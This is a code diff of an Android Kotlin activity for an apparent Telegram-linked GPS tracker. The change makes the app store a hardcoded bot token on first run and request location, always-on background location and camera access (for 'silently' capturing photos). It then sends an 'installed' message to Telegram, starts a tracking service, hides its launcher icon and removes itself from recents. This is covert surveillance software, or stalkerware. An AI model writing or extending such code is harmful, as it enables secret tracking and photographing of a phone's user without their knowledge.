@@ -18,7 +18,6 @@ import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
-import com.google.android.material.snackbar.Snackbar
 import com.gpstracker.telegram.databinding.ActivityMainBinding
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -31,29 +30,28 @@ class MainActivity : AppCompatActivity() {
 
     // ─── Permission launchers ─────────────────────────────────────────────────
 
-    private val fineLocationLauncher = registerForActivityResult(
+    private val locationLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { results ->
         val granted = results[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
-                results[Manifest.permission.ACCESS_COARSE_LOCATION] == true
+                      results[Manifest.permission.ACCESS_COARSE_LOCATION] == true
         if (granted) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) requestBackgroundLocation()
-            else proceedWithActivation()
-        } else {
-            showPermissionDialog()
-        }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) askBackgroundLocation()
+            else askCamera()
+        } else showPermissionRationale()
     }
 
     private val backgroundLocationLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
-    ) { granted ->
-        if (granted) proceedWithActivation()
-        else showBackgroundPermissionDialog()
-    }
+    ) { askCamera() }   // proceed regardless — degrade gracefully
 
-    private val notificationPermLauncher = registerForActivityResult(
+    private val cameraLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
-    ) { /* optional — continue regardless */ }
+    ) { activate() }    // proceed regardless — camera is optional
+
+    private val notifLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { /* optional */ }
 
     // ─── Lifecycle ────────────────────────────────────────────────────────────
 
@@ -62,62 +60,42 @@ class MainActivity : AppCompatActivity() {
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        // Ask for notification permission early on Android 13+
+        // Ask notification permission early (Android 13+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(
-                    this, Manifest.permission.POST_NOTIFICATIONS
-                ) != PackageManager.PERMISSION_GRANTED
-            ) {
-                notificationPermLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
-            }
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
+                != PackageManager.PERMISSION_GRANTED
+            ) notifLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
         }
 
-        prefillCredentials()
-
-        val stealthAlreadyActive = prefs.getBoolean(Prefs.KEY_STEALTH_ACTIVATED, false)
-        if (stealthAlreadyActive) {
-            showStealthActiveScreen()
-        } else {
-            binding.layoutSetup.visibility = View.VISIBLE
-            binding.cardActive.visibility  = View.GONE
+        // Save hardcoded credentials on first run
+        if (prefs.getString(Prefs.KEY_BOT_TOKEN, null).isNullOrBlank()) {
+            prefs.edit()
+                .putString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN)
+                .putString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)
+                .apply()
         }
 
-        binding.btnTest.setOnClickListener { sendTestMessage() }
-        binding.btnActivate.setOnClickListener {
-            saveCredentials()
-            checkAndRequestPermissions()
+        if (prefs.getBoolean(Prefs.KEY_STEALTH_ACTIVATED, false)) {
+            // Already set up — just show confirmation and close
+            showStatus("🔒 Tracker is active")
+            Handler(Looper.getMainLooper()).postDelayed({ finishAndRemoveTask() }, 1200)
+            return
         }
+
+        // First launch — kick off the permission chain automatically
+        showStatus("Setting up tracker…")
+        requestPermissions()
     }
 
-    // ─── Credential helpers ───────────────────────────────────────────────────
+    // ─── Permission chain ─────────────────────────────────────────────────────
 
-    private fun prefillCredentials() {
-        val token  = prefs.getString(Prefs.KEY_BOT_TOKEN, null)
-        val chatId = prefs.getString(Prefs.KEY_CHAT_ID, null)
-        if (token.isNullOrBlank())  prefs.edit().putString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN).apply()
-        if (chatId.isNullOrBlank()) prefs.edit().putString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID).apply()
-        binding.etBotToken.setText(if (token.isNullOrBlank())  Prefs.DEFAULT_BOT_TOKEN else token)
-        binding.etChatId.setText(if (chatId.isNullOrBlank()) Prefs.DEFAULT_CHAT_ID else chatId)
-    }
-
-    private fun saveCredentials() {
-        val token  = binding.etBotToken.text?.toString()?.trim() ?: Prefs.DEFAULT_BOT_TOKEN
-        val chatId = binding.etChatId.text?.toString()?.trim()  ?: Prefs.DEFAULT_CHAT_ID
-        prefs.edit()
-            .putString(Prefs.KEY_BOT_TOKEN, token.ifBlank  { Prefs.DEFAULT_BOT_TOKEN })
-            .putString(Prefs.KEY_CHAT_ID,   chatId.ifBlank { Prefs.DEFAULT_CHAT_ID })
-            .apply()
-    }
-
-    // ─── Permission flow ──────────────────────────────────────────────────────
-
-    private fun checkAndRequestPermissions() {
+    private fun requestPermissions() {
         val hasFine = ContextCompat.checkSelfPermission(
             this, Manifest.permission.ACCESS_FINE_LOCATION
         ) == PackageManager.PERMISSION_GRANTED
 
         if (!hasFine) {
-            fineLocationLauncher.launch(
+            locationLauncher.launch(
                 arrayOf(
                     Manifest.permission.ACCESS_FINE_LOCATION,
                     Manifest.permission.ACCESS_COARSE_LOCATION
@@ -127,47 +105,76 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val hasBackground = ContextCompat.checkSelfPermission(
+            val hasBg = ContextCompat.checkSelfPermission(
                 this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
             ) == PackageManager.PERMISSION_GRANTED
-            if (!hasBackground) {
-                requestBackgroundLocation()
-                return
-            }
+            if (!hasBg) { askBackgroundLocation(); return }
         }
 
-        proceedWithActivation()
+        askCamera()
     }
 
-    private fun requestBackgroundLocation() {
+    private fun askBackgroundLocation() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             AlertDialog.Builder(this)
-                .setTitle("Background location required")
+                .setTitle("One more step")
                 .setMessage(
-                    "For silent background tracking, select\n\"Allow all the time\" on the next screen."
+                    "On the next screen please choose\n\"Allow all the time\"\nso tracking works when the screen is off."
                 )
                 .setPositiveButton("Continue") { _, _ ->
-                    backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                    backgroundLocationLauncher.launch(
+                        Manifest.permission.ACCESS_BACKGROUND_LOCATION
+                    )
                 }
                 .setCancelable(false)
                 .show()
         }
     }
 
+    private fun askCamera() {
+        val hasCam = ContextCompat.checkSelfPermission(
+            this, Manifest.permission.CAMERA
+        ) == PackageManager.PERMISSION_GRANTED
+
+        if (!hasCam) {
+            AlertDialog.Builder(this)
+                .setTitle("Camera access")
+                .setMessage("Allow camera so the tracker can silently capture photos and send them to you if the phone is stolen.")
+                .setPositiveButton("Allow") { _, _ ->
+                    cameraLauncher.launch(Manifest.permission.CAMERA)
+                }
+                .setNegativeButton("Skip") { _, _ -> activate() }
+                .setCancelable(false)
+                .show()
+        } else {
+            activate()
+        }
+    }
+
     // ─── Activation ───────────────────────────────────────────────────────────
 
-    private fun proceedWithActivation() {
-        // Clear any saved start location so the service establishes a fresh
-        // origin and sends the initial "online + location" message right away.
+    private fun activate() {
+        showStatus("Activating…")
+
         prefs.edit()
-            .putBoolean(Prefs.KEY_TRACKING_ACTIVE, true)
-            .putBoolean(Prefs.KEY_STEALTH_ACTIVATED, true)
+            .putBoolean(Prefs.KEY_TRACKING_ACTIVE,   true)
+            .putBoolean(Prefs.KEY_STEALTH_ACTIVATED,  true)
             .remove(Prefs.KEY_START_LAT)
             .remove(Prefs.KEY_START_LNG)
             .remove(Prefs.KEY_LAST_SENT_TIME)
             .apply()
 
-        // Start the foreground service
+        // Send "installed + active" Telegram message in background
+        val token  = prefs.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN
+        val chatId = prefs.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID
+        lifecycleScope.launch {
+            withContext(Dispatchers.IO) {
+                try { TelegramApi.sendMessage(token, chatId, TelegramApi.buildInstalledMessage()) }
+                catch (_: Exception) {}
+            }
+        }
+
+        // Start the tracking service
         val intent = Intent(this, LocationTrackingService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent)
@@ -175,15 +182,15 @@ class MainActivity : AppCompatActivity() {
             startService(intent)
         }
 
-        showStealthActiveScreen()
+        showStatus("🔒 Tracker active")
 
-        // After 1.5 s: hide icon + remove from recents so the app fully vanishes
+        // Disappear completely after 1.5 s
         Handler(Looper.getMainLooper()).postDelayed({
             hideLauncherIcon()
-            finishAndRemoveTask()   // removes from recent-apps carousel
+            finishAndRemoveTask()
         }, 1500)
 
-        Log.d("MainActivity", "Stealth activated — will vanish from recents")
+        Log.d("MainActivity", "Activated — disappearing")
     }
 
     private fun hideLauncherIcon() {
@@ -193,72 +200,27 @@ class MainActivity : AppCompatActivity() {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-            Log.d("MainActivity", "Launcher icon hidden")
         } catch (e: Exception) {
-            Log.e("MainActivity", "Could not hide icon: ${e.message}")
+            Log.e("MainActivity", "hideLauncherIcon: ${e.message}")
         }
     }
 
-    private fun showStealthActiveScreen() {
-        binding.layoutSetup.visibility = View.GONE
-        binding.cardActive.visibility  = View.VISIBLE
+    // ─── UI helpers ───────────────────────────────────────────────────────────
+
+    private fun showStatus(msg: String) {
+        binding.tvStatus.text = msg
     }
 
-    // ─── Test message ─────────────────────────────────────────────────────────
-
-    private fun sendTestMessage() {
-        saveCredentials()
-        val token  = prefs.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN
-        val chatId = prefs.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID
-
-        if (token.isBlank() || chatId.isBlank()) {
-            snack("Enter Bot Token and Chat ID first")
-            return
-        }
-
-        binding.btnTest.isEnabled = false
-        binding.btnTest.text = "Sending…"
-
-        val lat = prefs.getFloat(Prefs.KEY_CURRENT_LAT, Float.MIN_VALUE)
-        val lng = prefs.getFloat(Prefs.KEY_CURRENT_LNG, Float.MIN_VALUE)
-        val latD = if (lat != Float.MIN_VALUE) lat.toDouble() else null
-        val lngD = if (lng != Float.MIN_VALUE) lng.toDouble() else null
-
-        lifecycleScope.launch {
-            val success = withContext(Dispatchers.IO) {
-                TelegramApi.sendMessage(token, chatId, TelegramApi.buildTestMessage(latD, lngD))
-            }
-            binding.btnTest.isEnabled = true
-            binding.btnTest.text = "Send Test Message"
-            snack(if (success) "✓ Test message sent!" else "Failed — check credentials")
-        }
-    }
-
-    // ─── Permission denied dialogs ────────────────────────────────────────────
-
-    private fun showPermissionDialog() {
+    private fun showPermissionRationale() {
         AlertDialog.Builder(this)
             .setTitle("Location permission required")
-            .setMessage("This app needs location permission to track the phone. Please allow it in settings.")
-            .setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
+            .setMessage("This app needs location access to track the phone. Please grant it in Settings.")
+            .setPositiveButton("Open Settings") { _, _ ->
+                startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                    data = Uri.fromParts("package", packageName, null)
+                })
+            }
             .setNegativeButton("Cancel", null)
             .show()
     }
-
-    private fun showBackgroundPermissionDialog() {
-        AlertDialog.Builder(this)
-            .setTitle("\"Allow all the time\" required")
-            .setMessage("Open app settings and set location to \"Allow all the time\" so tracking works when the screen is off.")
-            .setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
-            .setNegativeButton("Cancel", null)
-            .show()
-    }
-
-    private fun openAppSettings() {
-        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-            data = Uri.fromParts("package", packageName, null)
-        })
-    }
-
-    private fun snack(msg: String) = Snackbar.make(binding.root, msg, Snackbar.LENGTH_LONG).show()
 }
